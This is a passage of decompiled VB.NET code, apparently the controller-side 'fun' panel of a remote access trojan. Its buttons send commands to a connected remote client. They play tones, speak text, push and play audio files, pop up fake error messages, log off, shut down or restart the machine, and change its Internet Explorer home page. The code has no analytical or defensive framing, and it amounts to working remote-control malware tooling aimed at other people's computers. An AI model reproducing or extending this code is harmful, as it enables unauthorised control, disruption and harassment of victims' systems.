			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 311) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(311, 300)
			End If
		End Sub

		' Token: 0x060002C1 RID: 705 RVA: 0x0015F664 File Offset: 0x0015DA64
		Private Sub Button50_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 429) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(429, 300)
			End If
		End Sub

		' Token: 0x060002C2 RID: 706 RVA: 0x0015F6E4 File Offset: 0x0015DAE4
		Private Sub Button49_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 449) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(449, 300)
			End If
		End Sub

		' Token: 0x060002C3 RID: 707 RVA: 0x0015F764 File Offset: 0x0015DB64
		Private Sub Button42_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 369) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(369, 300)
			End If
		End Sub

		' Token: 0x060002C4 RID: 708 RVA: 0x0015F7E4 File Offset: 0x0015DBE4
		Private Sub Button48_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 491) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(491, 300)
			End If
		End Sub

		' Token: 0x060002C5 RID: 709 RVA: 0x0015F864 File Offset: 0x0015DC64
		Private Sub Button41_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 415) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(415, 300)
			End If
		End Sub

		' Token: 0x060002C6 RID: 710 RVA: 0x0015F8E4 File Offset: 0x0015DCE4
		Private Sub Button47_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 540) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(540, 300)
			End If
		End Sub

		' Token: 0x060002C7 RID: 711 RVA: 0x0015F964 File Offset: 0x0015DD64
		Private Sub Button40_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 466) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(466, 300)
			End If
		End Sub

		' Token: 0x060002C8 RID: 712 RVA: 0x0015F9E4 File Offset: 0x0015DDE4
		Private Sub Button46_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 593) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(593, 300)
			End If
		End Sub

		' Token: 0x060002C9 RID: 713 RVA: 0x0015FA64 File Offset: 0x0015DE64
		Private Sub Button45_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 623) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(623, 300)
			End If
		End Sub

		' Token: 0x060002CA RID: 714 RVA: 0x0015FAE4 File Offset: 0x0015DEE4
		Private Sub Button37_Click(sender As Object, e As EventArgs)
			Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""))
			Dim instance As Object = objectValue
			Dim type As Type = Nothing
			Dim memberName As String = "speak"
			Dim array As Object() = New Object(0) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim textBox As TextBox = Me.TextBox4
			array2(num) = textBox.Text
			Dim array3 As Object() = array
			Dim arguments As Object() = array3
			Dim argumentNames As String() = Nothing
			Dim typeArguments As Type() = Nothing
			Dim array4 As Boolean() = New Boolean() { True }
			NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array4, True)
			If array4(0) Then
				textBox.Text = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(String)))
			End If
		End Sub

		' Token: 0x060002CB RID: 715 RVA: 0x0015FB6C File Offset: 0x0015DF6C
		Private Sub Button36_Click(sender As Object, e As EventArgs)
			Me.s.Send("peech" + Class7.string_1 + Me.TextBox4.Text)
		End Sub

		' Token: 0x060002CC RID: 716 RVA: 0x0015FB98 File Offset: 0x0015DF98
		Private Sub Button56_Click(sender As Object, e As EventArgs)
			Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
			Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
			If flag Then
				Dim fileInfo As FileInfo = New FileInfo(openFileDialog.FileName)
				NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("sendmusicplay", MyProject.Forms.Form1.Yy), fileInfo.Name), MyProject.Forms.Form1.Yy), Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x17000108 RID: 264
		' (get) Token: 0x060002CD RID: 717 RVA: 0x0015FC38 File Offset: 0x0015E038
		Public ReadOnly Property title As Object
			Get
				Return Me.TextBox6.Text
			End Get
		End Property

		' Token: 0x17000109 RID: 265
		' (get) Token: 0x060002CE RID: 718 RVA: 0x0015FC58 File Offset: 0x0015E058
		Public ReadOnly Property message As Object
			Get
				Return Me.TextBox5.Text
			End Get
		End Property

		' Token: 0x1700010A RID: 266
		' (get) Token: 0x060002CF RID: 719 RVA: 0x0015FC78 File Offset: 0x0015E078
		Public ReadOnly Property messageicon As Object
			Get
				Dim checked As Boolean = Me.RadioButton1.Checked
				Dim result As Object
				If checked Then
					result = "1"
				Else
					checked = Me.RadioButton2.Checked
					If checked Then
						result = "2"
					Else
						checked = Me.RadioButton3.Checked
						If checked Then
							result = "3"
						Else
							checked = Me.RadioButton4.Checked
							If checked Then
								result = "4"
							Else
								result = "1"
							End If
						End If
					End If
				End If
				Return result
			End Get
		End Property

		' Token: 0x1700010B RID: 267
		' (get) Token: 0x060002D0 RID: 720 RVA: 0x0015FCF8 File Offset: 0x0015E0F8
		Public ReadOnly Property messagebutton As Object
			Get
				Dim checked As Boolean = Me.RadioButton5.Checked
				Dim result As Object
				If checked Then
					result = "1"
				Else
					checked = Me.RadioButton6.Checked
					If checked Then
						result = "2"
					Else
						checked = Me.RadioButton7.Checked
						If checked Then
							result = "3"
						Else
							checked = Me.RadioButton8.Checked
							If checked Then
								result = "4"
							Else
								checked = Me.RadioButton9.Checked
								If checked Then
									result = "5"
								Else
									checked = Me.RadioButton10.Checked
									If checked Then
										result = "6"
									Else
										result = "1"
									End If
								End If
							End If
						End If
					End If
				End If
				Return result
			End Get
		End Property

		' Token: 0x060002D1 RID: 721 RVA: 0x0015FDB0 File Offset: 0x0015E1B0
		Private Sub Button39_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("ErorrMsg", MyProject.Forms.Form1.Yy), Me.messageicon), MyProject.Forms.Form1.Yy), Me.messagebutton), MyProject.Forms.Form1.Yy), Me.title), MyProject.Forms.Form1.Yy), Me.message) }, Nothing, Nothing, Nothing, True)
		End Sub

		' Token: 0x060002D2 RID: 722 RVA: 0x0015FE64 File Offset: 0x0015E264
		Private Sub Button38_Click(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.RadioButton1.Checked
			Dim icon As MessageBoxIcon
			If checked Then
				icon = MessageBoxIcon.Asterisk
			Else
				checked = Me.RadioButton2.Checked
				If checked Then
					icon = MessageBoxIcon.Question
				Else
					checked = Me.RadioButton3.Checked
					If checked Then
						icon = MessageBoxIcon.Exclamation
					Else
						checked = Me.RadioButton4.Checked
						If checked Then
							icon = MessageBoxIcon.Hand
						Else
							icon = MessageBoxIcon.Asterisk
						End If
					End If
				End If
			End If
			checked = Me.RadioButton5.Checked
			Dim buttons As MessageBoxButtons
			If checked Then
				buttons = MessageBoxButtons.YesNo
			Else
				checked = Me.RadioButton6.Checked
				If checked Then
					buttons = MessageBoxButtons.YesNoCancel
				Else
					checked = Me.RadioButton7.Checked
					If checked Then
						buttons = MessageBoxButtons.OK
					Else
						checked = Me.RadioButton8.Checked
						If checked Then
							buttons = MessageBoxButtons.OKCancel
						Else
							checked = Me.RadioButton9.Checked
							If checked Then
								buttons = MessageBoxButtons.RetryCancel
							Else
								checked = Me.RadioButton10.Checked
								If checked Then
									buttons = MessageBoxButtons.AbortRetryIgnore
								Else
									buttons = MessageBoxButtons.OK
								End If
							End If
						End If
					End If
				End If
			End If
			MessageBox.Show(Me.TextBox5.Text, Me.TextBox6.Text, buttons, icon)
		End Sub

		' Token: 0x060002D3 RID: 723 RVA: 0x0015FF5C File Offset: 0x0015E35C
		Private Sub Button6_Click(sender As Object, e As EventArgs)
			Me.s.Send("logoff")
		End Sub

		' Token: 0x060002D4 RID: 724 RVA: 0x0015FF74 File Offset: 0x0015E374
		Private Sub Button7_Click(sender As Object, e As EventArgs)
			Me.s.Send("shutdowncomputer")
		End Sub

		' Token: 0x060002D5 RID: 725 RVA: 0x0015FF8C File Offset: 0x0015E38C
		Private Sub Button5_Click(sender As Object, e As EventArgs)
			Me.s.Send("restartcomputer")
		End Sub

		' Token: 0x060002D6 RID: 726 RVA: 0x0015FFA4 File Offset: 0x0015E3A4
		Private Sub Button34_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("IEhome", MyProject.Forms.Form1.Yy), Me.TextBox1.Text) }, Nothing, Nothing, Nothing, True)
		End Sub

		' Token: 0x060002D7 RID: 727 RVA: 0x00160000 File Offset: 0x0015E400
		Private Sub Button53_Click(sender As Object, e As EventArgs)
			Me.Panel2.Visible = False
			Me.Panel1.Visible = True
		End Sub

		' Token: 0x060002D8 RID: 728 RVA: 0x00160020 File Offset: 0x0015E420
		Private Sub Button55_Click(sender As Object, e As EventArgs)
			Me.Panel1.Visible = False
			Me.Panel2.Visible = True
		End Sub

		' Token: 0x040000EC RID: 236
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000EE RID: 238
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x040000EF RID: 239
		<AccessedThroughProperty("GroupBox7")>
		Private _GroupBox7 As GroupBox

		' Token: 0x040000F0 RID: 240
		<AccessedThroughProperty("Button14")>
		Private _Button14 As Button

		' Token: 0x040000F1 RID: 241
		<AccessedThroughProperty("Button15")>
		Private _Button15 As Button

		' Token: 0x040000F2 RID: 242
		<AccessedThroughProperty("GroupBox2")>
		Private _GroupBox2 As GroupBox

		' Token: 0x040000F3 RID: 243
		<AccessedThroughProperty("Button3")>
		Private _Button3 As Button

		' Token: 0x040000F4 RID: 244
		<AccessedThroughProperty("Button4")>
		Private _Button4 As Button

		' Token: 0x040000F5 RID: 245
		<AccessedThroughProperty("GroupBox8")>
		Private _GroupBox8 As GroupBox

		' Token: 0x040000F6 RID: 246
		<AccessedThroughProperty("Button16")>
		Private _Button16 As Button

		' Token: 0x040000F7 RID: 247
		<AccessedThroughProperty("Button17")>
		Private _Button17 As Button

		' Token: 0x040000F8 RID: 248
		<AccessedThroughProperty("GroupBox6")>
		Private _GroupBox6 As GroupBox

		' Token: 0x040000F9 RID: 249
		<AccessedThroughProperty("Button22")>
		Private _Button22 As Button

		' Token: 0x040000FA RID: 250
		<AccessedThroughProperty("Button23")>
		Private _Button23 As Button

		' Token: 0x040000FB RID: 251
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x040000FC RID: 252
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040000FD RID: 253
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x040000FE RID: 254
		<AccessedThroughProperty("GroupBox10")>
		Private _GroupBox10 As GroupBox

		' Token: 0x040000FF RID: 255
		<AccessedThroughProperty("Button19")>
		Private _Button19 As Button

		' Token: 0x04000100 RID: 256
		<AccessedThroughProperty("Button18")>
		Private _Button18 As Button

		' Token: 0x04000101 RID: 257
		<AccessedThroughProperty("GroupBox9")>
		Private _GroupBox9 As GroupBox

		' Token: 0x04000102 RID: 258
		<AccessedThroughProperty("Button12")>
		Private _Button12 As Button

		' Token: 0x04000103 RID: 259
		<AccessedThroughProperty("Button13")>
		Private _Button13 As Button

		' Token: 0x04000104 RID: 260
		<AccessedThroughProperty("GroupBox11")>
		Private _GroupBox11 As GroupBox

		' Token: 0x04000105 RID: 261
		<AccessedThroughProperty("Button21")>
		Private _Button21 As Button

		' Token: 0x04000106 RID: 262
		<AccessedThroughProperty("Button20")>
		Private _Button20 As Button

		' Token: 0x04000107 RID: 263
		<AccessedThroughProperty("GroupBox25")>
		Private _GroupBox25 As GroupBox

		' Token: 0x04000108 RID: 264
		<AccessedThroughProperty("Button28")>
		Private _Button28 As Button

		' Token: 0x04000109 RID: 265
		<AccessedThroughProperty("Button29")>
		Private _Button29 As Button

		' Token: 0x0400010A RID: 266
		<AccessedThroughProperty("GroupBox19")>
		Private _GroupBox19 As GroupBox

		' Token: 0x0400010B RID: 267
		<AccessedThroughProperty("Button37")>
		Private _Button37 As Button

		' Token: 0x0400010C RID: 268
		<AccessedThroughProperty("Button36")>
		Private _Button36 As Button

		' Token: 0x0400010D RID: 269
		<AccessedThroughProperty("TextBox4")>
		Private _TextBox4 As TextBox

		' Token: 0x0400010E RID: 270
		<AccessedThroughProperty("Button56")>
		Private _Button56 As Button

		' Token: 0x0400010F RID: 271
		<AccessedThroughProperty("GroupBox18")>
		Private _GroupBox18 As GroupBox

		' Token: 0x04000110 RID: 272
		<AccessedThroughProperty("Button40")>
		Private _Button40 As Button

		' Token: 0x04000111 RID: 273
		<AccessedThroughProperty("Button41")>
		Private _Button41 As Button

		' Token: 0x04000112 RID: 274
		<AccessedThroughProperty("Button42")>
		Private _Button42 As Button

		' Token: 0x04000113 RID: 275
		<AccessedThroughProperty("Button43")>
		Private _Button43 As Button

		' Token: 0x04000114 RID: 276
		<AccessedThroughProperty("Button44")>
		Private _Button44 As Button

		' Token: 0x04000115 RID: 277
		<AccessedThroughProperty("Button45")>
		Private _Button45 As Button

		' Token: 0x04000116 RID: 278
		<AccessedThroughProperty("Button46")>
		Private _Button46 As Button

		' Token: 0x04000117 RID: 279
		<AccessedThroughProperty("Button47")>
		Private _Button47 As Button

		' Token: 0x04000118 RID: 280
		<AccessedThroughProperty("Button48")>
		Private _Button48 As Button

		' Token: 0x04000119 RID: 281
		<AccessedThroughProperty("Button49")>
		Private _Button49 As Button

		' Token: 0x0400011A RID: 282
		<AccessedThroughProperty("Button50")>
		Private _Button50 As Button

		' Token: 0x0400011B RID: 283
		<AccessedThroughProperty("Button51")>
		Private _Button51 As Button

		' Token: 0x0400011C RID: 284
		<AccessedThroughProperty("Button52")>
		Private _Button52 As Button

		' Token: 0x0400011D RID: 285
		<AccessedThroughProperty("Check_Sound")>
		Private _Check_Sound As CheckBox

		' Token: 0x0400011E RID: 286
		<AccessedThroughProperty("GroupBox20")>
		Private _GroupBox20 As GroupBox

		' Token: 0x0400011F RID: 287
		<AccessedThroughProperty("RadioButton10")>
		Private _RadioButton10 As RadioButton

		' Token: 0x04000120 RID: 288
		<AccessedThroughProperty("RadioButton9")>
		Private _RadioButton9 As RadioButton

		' Token: 0x04000121 RID: 289
		<AccessedThroughProperty("RadioButton8")>
		Private _RadioButton8 As RadioButton

		' Token: 0x04000122 RID: 290
		<AccessedThroughProperty("RadioButton7")>
		Private _RadioButton7 As RadioButton

		' Token: 0x04000123 RID: 291
		<AccessedThroughProperty("RadioButton6")>
		Private _RadioButton6 As RadioButton

		' Token: 0x04000124 RID: 292
		<AccessedThroughProperty("RadioButton5")>
		Private _RadioButton5 As RadioButton

		' Token: 0x04000125 RID: 293
		<AccessedThroughProperty("GroupBox22")>
		Private _GroupBox22 As GroupBox

		' Token: 0x04000126 RID: 294
		<AccessedThroughProperty("RadioButton4")>
		Private _RadioButton4 As RadioButton

		' Token: 0x04000127 RID: 295
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x04000128 RID: 296
		<AccessedThroughProperty("RadioButton3")>
		Private _RadioButton3 As RadioButton

		' Token: 0x04000129 RID: 297
		<AccessedThroughProperty("PictureBox3")>
		Private _PictureBox3 As PictureBox

		' Token: 0x0400012A RID: 298
		<AccessedThroughProperty("RadioButton2")>
		Private _RadioButton2 As RadioButton

		' Token: 0x0400012B RID: 299
		<AccessedThroughProperty("PictureBox2")>
		Private _PictureBox2 As PictureBox

		' Token: 0x0400012C RID: 300
		<AccessedThroughProperty("RadioButton1")>
		Private _RadioButton1 As RadioButton

		' Token: 0x0400012D RID: 301
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x0400012E RID: 302
		<AccessedThroughProperty("GroupBox21")>
		Private _GroupBox21 As GroupBox

		' Token: 0x0400012F RID: 303
		<AccessedThroughProperty("TextBox5")>
		Private _TextBox5 As TextBox

		' Token: 0x04000130 RID: 304
		<AccessedThroughProperty("TextBox6")>
		Private _TextBox6 As TextBox

		' Token: 0x04000131 RID: 305
		<AccessedThroughProperty("Button39")>
		Private _Button39 As Button

		' Token: 0x04000132 RID: 306
		<AccessedThroughProperty("Button38")>
		Private _Button38 As Button

		' Token: 0x04000133 RID: 307
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x04000134 RID: 308
		<AccessedThroughProperty("Panel2")>
		Private _Panel2 As Panel

		' Token: 0x04000135 RID: 309
		<AccessedThroughProperty("Panel4")>
		Private _Panel4 As Panel

		' Token: 0x04000136 RID: 310
		<AccessedThroughProperty("Button53")>
		Private _Button53 As Button

		' Token: 0x04000137 RID: 311
		<AccessedThroughProperty("Panel6")>
		Private _Panel6 As Panel

		' Token: 0x04000138 RID: 312
		<AccessedThroughProperty("Button55")>
		Private _Button55 As Button

		' Token: 0x04000139 RID: 313
		<AccessedThroughProperty("Panel7")>
		Private _Panel7 As Panel

		' Token: 0x0400013A RID: 314
		<AccessedThroughProperty("GroupBox16")>
		Private _GroupBox16 As GroupBox

		' Token: 0x0400013B RID: 315
		<AccessedThroughProperty("Button34")>
		Private _Button34 As Button

		' Token: 0x0400013C RID: 316
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x0400013D RID: 317
		<AccessedThroughProperty("GroupBox3")>
		Private _GroupBox3 As GroupBox

		' Token: 0x0400013E RID: 318
		<AccessedThroughProperty("Button5")>
		Private _Button5 As Button

		' Token: 0x0400013F RID: 319
		<AccessedThroughProperty("Button6")>
		Private _Button6 As Button

		' Token: 0x04000140 RID: 320
		<AccessedThroughProperty("Button7")>
		Private _Button7 As Button

		' Token: 0x04000141 RID: 321
		Public s As Client
	End Class
End Namespace
